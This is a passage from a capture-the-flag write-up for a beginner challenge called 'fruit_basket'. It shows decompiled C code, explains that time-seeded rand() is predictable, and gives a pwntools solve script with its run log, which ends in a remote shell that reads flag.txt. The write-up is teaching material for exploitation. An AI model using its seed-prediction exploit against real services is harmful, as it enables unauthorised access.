</span><span id=__span-17-44><a id=__codelineno-17-44 name=__codelineno-17-44 href=#__codelineno-17-44></a><span class=w>    </span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strcspn</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&quot;</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
</span><span id=__span-17-45><a id=__codelineno-17-45 name=__codelineno-17-45 href=#__codelineno-17-45></a><span class=w>    </span><span class=n>buf</span><span class=p>[</span><span class=n>len</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span><span id=__span-17-46><a id=__codelineno-17-46 name=__codelineno-17-46 href=#__codelineno-17-46></a><span class=w>    </span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>fruit</span><span class=p>);</span>
</span><span id=__span-17-47><a id=__codelineno-17-47 name=__codelineno-17-47 href=#__codelineno-17-47></a><span class=w>    </span><span class=n>r</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strncmp</span><span class=p>(</span><span class=n>fruit</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>len</span><span class=p>);</span>
</span><span id=__span-17-48><a id=__codelineno-17-48 name=__codelineno-17-48 href=#__codelineno-17-48></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>r</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-17-49><a id=__codelineno-17-49 name=__codelineno-17-49 href=#__codelineno-17-49></a><span class=w>      </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Oops ! Wrong Guess ..&quot;</span><span class=p>);</span>
</span><span id=__span-17-50><a id=__codelineno-17-50 name=__codelineno-17-50 href=#__codelineno-17-50></a><span class=w>      </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;No shell for you :(&quot;</span><span class=p>);</span>
</span><span id=__span-17-51><a id=__codelineno-17-51 name=__codelineno-17-51 href=#__codelineno-17-51></a><span class=w>      </span><span class=n>shell</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>false</span><span class=p>;</span>
</span><span id=__span-17-52><a id=__codelineno-17-52 name=__codelineno-17-52 href=#__codelineno-17-52></a><span class=w>      </span><span class=k>goto</span><span class=w> </span><span class=n>LAB_001014ca</span><span class=p>;</span>
</span><span id=__span-17-53><a id=__codelineno-17-53 name=__codelineno-17-53 href=#__codelineno-17-53></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-17-54><a id=__codelineno-17-54 name=__codelineno-17-54 href=#__codelineno-17-54></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Correct !&quot;</span><span class=p>);</span>
</span><span id=__span-17-55><a id=__codelineno-17-55 name=__codelineno-17-55 href=#__codelineno-17-55></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;&quot;</span><span class=p>);</span>
</span><span id=__span-17-56><a id=__codelineno-17-56 name=__codelineno-17-56 href=#__codelineno-17-56></a><span class=w>    </span><span class=n>i</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-17-57><a id=__codelineno-17-57 name=__codelineno-17-57 href=#__codelineno-17-57></a><span class=w>  </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=p>(</span><span class=w> </span><span class=nb>true</span><span class=w> </span><span class=p>);</span>
</span><span id=__span-17-58><a id=__codelineno-17-58 name=__codelineno-17-58 href=#__codelineno-17-58></a><span class=p>}</span>
</span></code></pre></div> <p>The <code>fruits</code> is a global variable stored directly inside the binary which is a two dimensional array that is a list of fruits.</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-18-1><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a>00102008    Apple
</span><span id=__span-18-2><a id=__codelineno-18-2 name=__codelineno-18-2 href=#__codelineno-18-2></a>0010200e    Orange
</span><span id=__span-18-3><a id=__codelineno-18-3 name=__codelineno-18-3 href=#__codelineno-18-3></a>00102015    Mango
</span><span id=__span-18-4><a id=__codelineno-18-4 name=__codelineno-18-4 href=#__codelineno-18-4></a>0010201b    Banana
</span><span id=__span-18-5><a id=__codelineno-18-5 name=__codelineno-18-5 href=#__codelineno-18-5></a>00102022    Pineapple
</span><span id=__span-18-6><a id=__codelineno-18-6 name=__codelineno-18-6 href=#__codelineno-18-6></a>0010202c    Watermelon
</span><span id=__span-18-7><a id=__codelineno-18-7 name=__codelineno-18-7 href=#__codelineno-18-7></a>00102037    Guava
</span><span id=__span-18-8><a id=__codelineno-18-8 name=__codelineno-18-8 href=#__codelineno-18-8></a>0010203d    Kiwi
</span><span id=__span-18-9><a id=__codelineno-18-9 name=__codelineno-18-9 href=#__codelineno-18-9></a>00102042    Strawberry
</span><span id=__span-18-10><a id=__codelineno-18-10 name=__codelineno-18-10 href=#__codelineno-18-10></a>0010204d    Peach
</span></code></pre></div> <p>We have to guess all 50 fruits right. There seems to be no way of doing a buffer overflow or format string exploit in this code. So we target the seed that is being used to generate all random numbers. If we can use same seed to start our rng, we will arrive at the same random number. But the seed they are using is the system time using <code>seed(time(0))</code>. At first I thought well no luck here. But, if we think about it, if both us and the server starts at the same time, we will get the same time and eventually the same seed. The cstdlib <code>time(0)</code> returns time int the second resolution. So, we can use the fact that there is not much delay in between our communication, we can basically get the server and our rng to start with the same seed. The following code shows how we can call the cstdlib functions from within python with ctypes and write an exploit to get shell.</p> <div class="language-py highlight"><pre><span></span><code><span id=__span-19-1><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a><span class=ch>#!/usr/bin/env python</span>
</span><span id=__span-19-2><a id=__codelineno-19-2 name=__codelineno-19-2 href=#__codelineno-19-2></a>
</span><span id=__span-19-3><a id=__codelineno-19-3 name=__codelineno-19-3 href=#__codelineno-19-3></a><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>CDLL</span>
</span><span id=__span-19-4><a id=__codelineno-19-4 name=__codelineno-19-4 href=#__codelineno-19-4></a>
</span><span id=__span-19-5><a id=__codelineno-19-5 name=__codelineno-19-5 href=#__codelineno-19-5></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>remote</span><span class=p>,</span> <span class=n>gdb</span><span class=p>,</span> <span class=n>context</span><span class=p>,</span> <span class=n>log</span><span class=p>,</span> <span class=n>p64</span><span class=p>,</span> <span class=n>process</span><span class=p>,</span> <span class=n>u64</span>
</span><span id=__span-19-6><a id=__codelineno-19-6 name=__codelineno-19-6 href=#__codelineno-19-6></a>
</span><span id=__span-19-7><a id=__codelineno-19-7 name=__codelineno-19-7 href=#__codelineno-19-7></a><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&quot;debug&quot;</span>
</span><span id=__span-19-8><a id=__codelineno-19-8 name=__codelineno-19-8 href=#__codelineno-19-8></a><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span> <span class=s2>&quot;split-window&quot;</span><span class=p>,</span> <span class=s2>&quot;-h&quot;</span><span class=p>]</span>
</span><span id=__span-19-9><a id=__codelineno-19-9 name=__codelineno-19-9 href=#__codelineno-19-9></a>
</span><span id=__span-19-10><a id=__codelineno-19-10 name=__codelineno-19-10 href=#__codelineno-19-10></a><span class=n>fruits</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&quot;</span><span class=se>\x08\x20\x10\x00\x00\x00\x00\x00\x0e\x20\x10\x00\x00\x00\x00\x00\x15\x20\x10\x00\x00\x00\x00\x00\x1b\x20\x10\x00\x00\x00\x00\x00\x22\x20\x10\x00\x00\x00\x00\x00\x2c\x20\x10\x00\x00\x00\x00\x00\x37\x20\x10\x00\x00\x00\x00\x00\x3d\x20\x10\x00\x00\x00\x00\x00\x42\x20\x10\x00\x00\x00\x00\x00\x4d\x20\x10\x00\x00\x00\x00\x00</span><span class=s2>&quot;</span>
</span><span id=__span-19-11><a id=__codelineno-19-11 name=__codelineno-19-11 href=#__codelineno-19-11></a><span class=n>fruits</span> <span class=o>=</span> <span class=p>[</span><span class=n>u64</span><span class=p>(</span><span class=n>fruits</span><span class=p>[</span><span class=n>i</span> <span class=p>:</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>8</span><span class=p>])</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>fruits</span><span class=p>),</span> <span class=mi>8</span><span class=p>)]</span>
</span><span id=__span-19-12><a id=__codelineno-19-12 name=__codelineno-19-12 href=#__codelineno-19-12></a>
</span><span id=__span-19-13><a id=__codelineno-19-13 name=__codelineno-19-13 href=#__codelineno-19-13></a><span class=n>fruit_basket</span> <span class=o>=</span> <span class=p>{</span>
</span><span id=__span-19-14><a id=__codelineno-19-14 name=__codelineno-19-14 href=#__codelineno-19-14></a>    <span class=mh>0x00102008</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Apple&quot;</span><span class=p>,</span>
</span><span id=__span-19-15><a id=__codelineno-19-15 name=__codelineno-19-15 href=#__codelineno-19-15></a>    <span class=mh>0x0010200E</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Orange&quot;</span><span class=p>,</span>
</span><span id=__span-19-16><a id=__codelineno-19-16 name=__codelineno-19-16 href=#__codelineno-19-16></a>    <span class=mh>0x00102015</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Mango&quot;</span><span class=p>,</span>
</span><span id=__span-19-17><a id=__codelineno-19-17 name=__codelineno-19-17 href=#__codelineno-19-17></a>    <span class=mh>0x0010201B</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Banana&quot;</span><span class=p>,</span>
</span><span id=__span-19-18><a id=__codelineno-19-18 name=__codelineno-19-18 href=#__codelineno-19-18></a>    <span class=mh>0x00102022</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Pineapple&quot;</span><span class=p>,</span>
</span><span id=__span-19-19><a id=__codelineno-19-19 name=__codelineno-19-19 href=#__codelineno-19-19></a>    <span class=mh>0x0010202C</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Watermelon&quot;</span><span class=p>,</span>
</span><span id=__span-19-20><a id=__codelineno-19-20 name=__codelineno-19-20 href=#__codelineno-19-20></a>    <span class=mh>0x00102037</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Guava&quot;</span><span class=p>,</span>
</span><span id=__span-19-21><a id=__codelineno-19-21 name=__codelineno-19-21 href=#__codelineno-19-21></a>    <span class=mh>0x0010203D</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Kiwi&quot;</span><span class=p>,</span>
</span><span id=__span-19-22><a id=__codelineno-19-22 name=__codelineno-19-22 href=#__codelineno-19-22></a>    <span class=mh>0x00102042</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Strawberry&quot;</span><span class=p>,</span>
</span><span id=__span-19-23><a id=__codelineno-19-23 name=__codelineno-19-23 href=#__codelineno-19-23></a>    <span class=mh>0x0010204D</span><span class=p>:</span> <span class=sa>b</span><span class=s2>&quot;Peach&quot;</span><span class=p>,</span>
</span><span id=__span-19-24><a id=__codelineno-19-24 name=__codelineno-19-24 href=#__codelineno-19-24></a><span class=p>}</span>
</span><span id=__span-19-25><a id=__codelineno-19-25 name=__codelineno-19-25 href=#__codelineno-19-25></a>
</span><span id=__span-19-26><a id=__codelineno-19-26 name=__codelineno-19-26 href=#__codelineno-19-26></a><span class=n>libc</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s2>&quot;libc.so.6&quot;</span><span class=p>)</span>
</span><span id=__span-19-27><a id=__codelineno-19-27 name=__codelineno-19-27 href=#__codelineno-19-27></a><span class=c1># p = process(&quot;./chal&quot;)</span>
</span><span id=__span-19-28><a id=__codelineno-19-28 name=__codelineno-19-28 href=#__codelineno-19-28></a><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&quot;34.70.212.151&quot;</span><span class=p>,</span> <span class=mi>8006</span><span class=p>)</span>
</span><span id=__span-19-29><a id=__codelineno-19-29 name=__codelineno-19-29 href=#__codelineno-19-29></a><span class=n>seed</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>time</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-19-30><a id=__codelineno-19-30 name=__codelineno-19-30 href=#__codelineno-19-30></a><span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>seed</span><span class=p>)</span>
</span><span id=__span-19-31><a id=__codelineno-19-31 name=__codelineno-19-31 href=#__codelineno-19-31></a><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;using </span><span class=si>{</span><span class=n>seed</span><span class=si>=}</span><span class=s2>&quot;</span><span class=p>)</span>
</span><span id=__span-19-32><a id=__codelineno-19-32 name=__codelineno-19-32 href=#__codelineno-19-32></a>
</span><span id=__span-19-33><a id=__codelineno-19-33 name=__codelineno-19-33 href=#__codelineno-19-33></a><span class=c1># gdb.attach(</span>
</span><span id=__span-19-34><a id=__codelineno-19-34 name=__codelineno-19-34 href=#__codelineno-19-34></a><span class=c1>#     p,</span>
</span><span id=__span-19-35><a id=__codelineno-19-35 name=__codelineno-19-35 href=#__codelineno-19-35></a><span class=c1>#     &quot;&quot;&quot;</span>
</span><span id=__span-19-36><a id=__codelineno-19-36 name=__codelineno-19-36 href=#__codelineno-19-36></a><span class=c1>#     set follow-fork-mode child</span>
</span><span id=__span-19-37><a id=__codelineno-19-37 name=__codelineno-19-37 href=#__codelineno-19-37></a><span class=c1>#     break *(main+318)</span>
</span><span id=__span-19-38><a id=__codelineno-19-38 name=__codelineno-19-38 href=#__codelineno-19-38></a><span class=c1>#     continue</span>
</span><span id=__span-19-39><a id=__codelineno-19-39 name=__codelineno-19-39 href=#__codelineno-19-39></a><span class=c1>#     &quot;&quot;&quot;,</span>
</span><span id=__span-19-40><a id=__codelineno-19-40 name=__codelineno-19-40 href=#__codelineno-19-40></a><span class=c1># )</span>
</span><span id=__span-19-41><a id=__codelineno-19-41 name=__codelineno-19-41 href=#__codelineno-19-41></a>
</span><span id=__span-19-42><a id=__codelineno-19-42 name=__codelineno-19-42 href=#__codelineno-19-42></a><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>50</span><span class=p>):</span>
</span><span id=__span-19-43><a id=__codelineno-19-43 name=__codelineno-19-43 href=#__codelineno-19-43></a>    <span class=n>rin</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>fruits</span><span class=p>)</span>
</span><span id=__span-19-44><a id=__codelineno-19-44 name=__codelineno-19-44 href=#__codelineno-19-44></a>    <span class=n>fruit</span> <span class=o>=</span> <span class=n>fruit_basket</span><span class=p>[</span><span class=n>fruits</span><span class=p>[</span><span class=n>rin</span><span class=p>]]</span>
</span><span id=__span-19-45><a id=__codelineno-19-45 name=__codelineno-19-45 href=#__codelineno-19-45></a>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;rand = </span><span class=si>{</span><span class=n>rin</span><span class=si>}</span><span class=s2>, fruit = </span><span class=si>{</span><span class=n>fruit</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
</span><span id=__span-19-46><a id=__codelineno-19-46 name=__codelineno-19-46 href=#__codelineno-19-46></a>    <span class=k>try</span><span class=p>:</span>
</span><span id=__span-19-47><a id=__codelineno-19-47 name=__codelineno-19-47 href=#__codelineno-19-47></a>        <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;Your guess : &quot;</span><span class=p>,</span> <span class=n>fruit</span><span class=p>)</span>
</span><span id=__span-19-48><a id=__codelineno-19-48 name=__codelineno-19-48 href=#__codelineno-19-48></a>    <span class=k>except</span><span class=p>:</span>  <span class=c1># noqa: E722</span>
</span><span id=__span-19-49><a id=__codelineno-19-49 name=__codelineno-19-49 href=#__codelineno-19-49></a>        <span class=k>break</span>
</span><span id=__span-19-50><a id=__codelineno-19-50 name=__codelineno-19-50 href=#__codelineno-19-50></a>
</span><span id=__span-19-51><a id=__codelineno-19-51 name=__codelineno-19-51 href=#__codelineno-19-51></a><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></code></pre></div> <div class="language-sh highlight"><pre><span></span><code><span id=__span-20-1><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a>backdoor/beginner/fruit_basket<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>!?<span class=o>]</span><span class=w> </span>via<span class=w> </span>🐍<span class=w> </span>v3.11.6
</span><span id=__span-20-2><a id=__codelineno-20-2 name=__codelineno-20-2 href=#__codelineno-20-2></a>❯<span class=w> </span>./sol.py
</span><span id=__span-20-3><a id=__codelineno-20-3 name=__codelineno-20-3 href=#__codelineno-20-3></a><span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./chal&#39;</span><span class=w> </span><span class=nv>argv</span><span class=o>=[</span>b<span class=s1>&#39;./chal&#39;</span><span class=o>]</span><span class=w> </span>:<span class=w> </span>pid<span class=w> </span><span class=m>128256</span>
</span><span id=__span-20-4><a id=__codelineno-20-4 name=__codelineno-20-4 href=#__codelineno-20-4></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span>using<span class=w> </span><span class=nv>seed</span><span class=o>=</span><span class=m>1703526848</span>
</span><span id=__span-20-5><a id=__codelineno-20-5 name=__codelineno-20-5 href=#__codelineno-20-5></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=nv>rand</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>7</span>,<span class=w> </span><span class=nv>fruit</span><span class=w> </span><span class=o>=</span><span class=w> </span>b<span class=s1>&#39;Kiwi&#39;</span>
</span><span id=__span-20-6><a id=__codelineno-20-6 name=__codelineno-20-6 href=#__codelineno-20-6></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0xb8<span class=w> </span>bytes:
</span><span id=__span-20-7><a id=__codelineno-20-7 name=__codelineno-20-7 href=#__codelineno-20-7></a><span class=w>    </span>b<span class=s1>&#39;There is a basket full of fruits, guess the fruit which I am holding ...\n&#39;</span>
</span><span id=__span-20-8><a id=__codelineno-20-8 name=__codelineno-20-8 href=#__codelineno-20-8></a><span class=w>    </span>b<span class=s1>&#39;This seems hard, so I will give an awesome reward, something like a shell if you guess all the fruits right :)\n&#39;</span>
</span><span id=__span-20-9><a id=__codelineno-20-9 name=__codelineno-20-9 href=#__codelineno-20-9></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x26<span class=w> </span>bytes:
</span><span id=__span-20-10><a id=__codelineno-20-10 name=__codelineno-20-10 href=#__codelineno-20-10></a><span class=w>    </span>b<span class=s1>&#39;\n&#39;</span>
</span><span id=__span-20-11><a id=__codelineno-20-11 name=__codelineno-20-11 href=#__codelineno-20-11></a><span class=w>    </span>b<span class=s1>&#39;The game starts now !\n&#39;</span>
</span><span id=__span-20-12><a id=__codelineno-20-12 name=__codelineno-20-12 href=#__codelineno-20-12></a><span class=w>    </span>b<span class=s1>&#39;1\n&#39;</span>
</span><span id=__span-20-13><a id=__codelineno-20-13 name=__codelineno-20-13 href=#__codelineno-20-13></a><span class=w>    </span>b<span class=s1>&#39;Your guess : &#39;</span>
</span><span id=__span-20-14><a id=__codelineno-20-14 name=__codelineno-20-14 href=#__codelineno-20-14></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x5<span class=w> </span>bytes:
</span><span id=__span-20-15><a id=__codelineno-20-15 name=__codelineno-20-15 href=#__codelineno-20-15></a><span class=w>    </span>b<span class=s1>&#39;Kiwi\n&#39;</span>
</span><span id=__span-20-16><a id=__codelineno-20-16 name=__codelineno-20-16 href=#__codelineno-20-16></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=nv>rand</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>2</span>,<span class=w> </span><span class=nv>fruit</span><span class=w> </span><span class=o>=</span><span class=w> </span>b<span class=s1>&#39;Mango&#39;</span>
</span><span id=__span-20-17><a id=__codelineno-20-17 name=__codelineno-20-17 href=#__codelineno-20-17></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x1a<span class=w> </span>bytes:
</span><span id=__span-20-18><a id=__codelineno-20-18 name=__codelineno-20-18 href=#__codelineno-20-18></a><span class=w>    </span>b<span class=s1>&#39;Correct !\n&#39;</span>
</span><span id=__span-20-19><a id=__codelineno-20-19 name=__codelineno-20-19 href=#__codelineno-20-19></a><span class=w>    </span>b<span class=s1>&#39;\n&#39;</span>
</span><span id=__span-20-20><a id=__codelineno-20-20 name=__codelineno-20-20 href=#__codelineno-20-20></a><span class=w>    </span>b<span class=s1>&#39;2\n&#39;</span>
</span><span id=__span-20-21><a id=__codelineno-20-21 name=__codelineno-20-21 href=#__codelineno-20-21></a><span class=w>    </span>b<span class=s1>&#39;Your guess : &#39;</span>
</span><span id=__span-20-22><a id=__codelineno-20-22 name=__codelineno-20-22 href=#__codelineno-20-22></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x6<span class=w> </span>bytes:
</span><span id=__span-20-23><a id=__codelineno-20-23 name=__codelineno-20-23 href=#__codelineno-20-23></a><span class=w>    </span>b<span class=s1>&#39;Mango\n&#39;</span>
</span><span id=__span-20-24><a id=__codelineno-20-24 name=__codelineno-20-24 href=#__codelineno-20-24></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=nv>rand</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>7</span>,<span class=w> </span><span class=nv>fruit</span><span class=w> </span><span class=o>=</span><span class=w> </span>b<span class=s1>&#39;Kiwi&#39;</span>
</span><span id=__span-20-25><a id=__codelineno-20-25 name=__codelineno-20-25 href=#__codelineno-20-25></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x1a<span class=w> </span>bytes:
</span><span id=__span-20-26><a id=__codelineno-20-26 name=__codelineno-20-26 href=#__codelineno-20-26></a><span class=w>    </span>b<span class=s1>&#39;Correct !\n&#39;</span>
</span><span id=__span-20-27><a id=__codelineno-20-27 name=__codelineno-20-27 href=#__codelineno-20-27></a><span class=w>    </span>.
</span><span id=__span-20-28><a id=__codelineno-20-28 name=__codelineno-20-28 href=#__codelineno-20-28></a><span class=w>    </span>.
</span><span id=__span-20-29><a id=__codelineno-20-29 name=__codelineno-20-29 href=#__codelineno-20-29></a><span class=w>    </span>.
</span><span id=__span-20-30><a id=__codelineno-20-30 name=__codelineno-20-30 href=#__codelineno-20-30></a><span class=w>    </span>.
</span><span id=__span-20-31><a id=__codelineno-20-31 name=__codelineno-20-31 href=#__codelineno-20-31></a><span class=w>    </span>b<span class=s1>&#39;\n&#39;</span>
</span><span id=__span-20-32><a id=__codelineno-20-32 name=__codelineno-20-32 href=#__codelineno-20-32></a><span class=w>    </span>b<span class=s1>&#39;49\n&#39;</span>
</span><span id=__span-20-33><a id=__codelineno-20-33 name=__codelineno-20-33 href=#__codelineno-20-33></a><span class=w>    </span>b<span class=s1>&#39;Your guess : &#39;</span>
</span><span id=__span-20-34><a id=__codelineno-20-34 name=__codelineno-20-34 href=#__codelineno-20-34></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0xb<span class=w> </span>bytes:
</span><span id=__span-20-35><a id=__codelineno-20-35 name=__codelineno-20-35 href=#__codelineno-20-35></a><span class=w>    </span>b<span class=s1>&#39;Strawberry\n&#39;</span>
</span><span id=__span-20-36><a id=__codelineno-20-36 name=__codelineno-20-36 href=#__codelineno-20-36></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=nv>rand</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>7</span>,<span class=w> </span><span class=nv>fruit</span><span class=w> </span><span class=o>=</span><span class=w> </span>b<span class=s1>&#39;Kiwi&#39;</span>
</span><span id=__span-20-37><a id=__codelineno-20-37 name=__codelineno-20-37 href=#__codelineno-20-37></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x1b<span class=w> </span>bytes:
</span><span id=__span-20-38><a id=__codelineno-20-38 name=__codelineno-20-38 href=#__codelineno-20-38></a><span class=w>    </span>b<span class=s1>&#39;Correct !\n&#39;</span>
</span><span id=__span-20-39><a id=__codelineno-20-39 name=__codelineno-20-39 href=#__codelineno-20-39></a><span class=w>    </span>b<span class=s1>&#39;\n&#39;</span>
</span><span id=__span-20-40><a id=__codelineno-20-40 name=__codelineno-20-40 href=#__codelineno-20-40></a><span class=w>    </span>b<span class=s1>&#39;50\n&#39;</span>
</span><span id=__span-20-41><a id=__codelineno-20-41 name=__codelineno-20-41 href=#__codelineno-20-41></a><span class=w>    </span>b<span class=s1>&#39;Your guess : &#39;</span>
</span><span id=__span-20-42><a id=__codelineno-20-42 name=__codelineno-20-42 href=#__codelineno-20-42></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x5<span class=w> </span>bytes:
</span><span id=__span-20-43><a id=__codelineno-20-43 name=__codelineno-20-43 href=#__codelineno-20-43></a><span class=w>    </span>b<span class=s1>&#39;Kiwi\n&#39;</span>
</span><span id=__span-20-44><a id=__codelineno-20-44 name=__codelineno-20-44 href=#__codelineno-20-44></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
</span><span id=__span-20-45><a id=__codelineno-20-45 name=__codelineno-20-45 href=#__codelineno-20-45></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0xb<span class=w> </span>bytes:
</span><span id=__span-20-46><a id=__codelineno-20-46 name=__codelineno-20-46 href=#__codelineno-20-46></a><span class=w>    </span>b<span class=s1>&#39;Correct !\n&#39;</span>
</span><span id=__span-20-47><a id=__codelineno-20-47 name=__codelineno-20-47 href=#__codelineno-20-47></a><span class=w>    </span>b<span class=s1>&#39;\n&#39;</span>
</span><span id=__span-20-48><a id=__codelineno-20-48 name=__codelineno-20-48 href=#__codelineno-20-48></a>Correct<span class=w> </span>!
</span><span id=__span-20-49><a id=__codelineno-20-49 name=__codelineno-20-49 href=#__codelineno-20-49></a>
</span><span id=__span-20-50><a id=__codelineno-20-50 name=__codelineno-20-50 href=#__codelineno-20-50></a>$<span class=w> </span>ls
</span><span id=__span-20-51><a id=__codelineno-20-51 name=__codelineno-20-51 href=#__codelineno-20-51></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x3<span class=w> </span>bytes:
</span><span id=__span-20-52><a id=__codelineno-20-52 name=__codelineno-20-52 href=#__codelineno-20-52></a><span class=w>    </span>b<span class=s1>&#39;ls\n&#39;</span>
</span><span id=__span-20-53><a id=__codelineno-20-53 name=__codelineno-20-53 href=#__codelineno-20-53></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x16<span class=w> </span>bytes:
</span><span id=__span-20-54><a id=__codelineno-20-54 name=__codelineno-20-54 href=#__codelineno-20-54></a><span class=w>    </span>b<span class=s1>&#39;chal  flag.txt\n&#39;</span>
</span><span id=__span-20-55><a id=__codelineno-20-55 name=__codelineno-20-55 href=#__codelineno-20-55></a>chal<span class=w>  </span>flag.txt
</span><span id=__span-20-56><a id=__codelineno-20-56 name=__codelineno-20-56 href=#__codelineno-20-56></a>$<span class=w> </span>cat<span class=w> </span>flag.txt
</span><span id=__span-20-57><a id=__codelineno-20-57 name=__codelineno-20-57 href=#__codelineno-20-57></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0xd<span class=w> </span>bytes:
</span><span id=__span-20-58><a id=__codelineno-20-58 name=__codelineno-20-58 href=#__codelineno-20-58></a><span class=w>    </span>b<span class=s1>&#39;cat flag.txt\n&#39;</span>
</span><span id=__span-20-59><a id=__codelineno-20-59 name=__codelineno-20-59 href=#__codelineno-20-59></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x22<span class=w> </span>bytes:
</span><span id=__span-20-60><a id=__codelineno-20-60 name=__codelineno-20-60 href=#__codelineno-20-60></a><span class=w>    </span>b<span class=s1>&#39;flag{fru17s_w3r3nt_r4nd0m_4t_a11}\n&#39;</span>
</span><span id=__span-20-61><a id=__codelineno-20-61 name=__codelineno-20-61 href=#__codelineno-20-61></a>flag<span class=o>{</span>fru17s_w3r3nt_r4nd0m_4t_a11<span class=o>}</span>
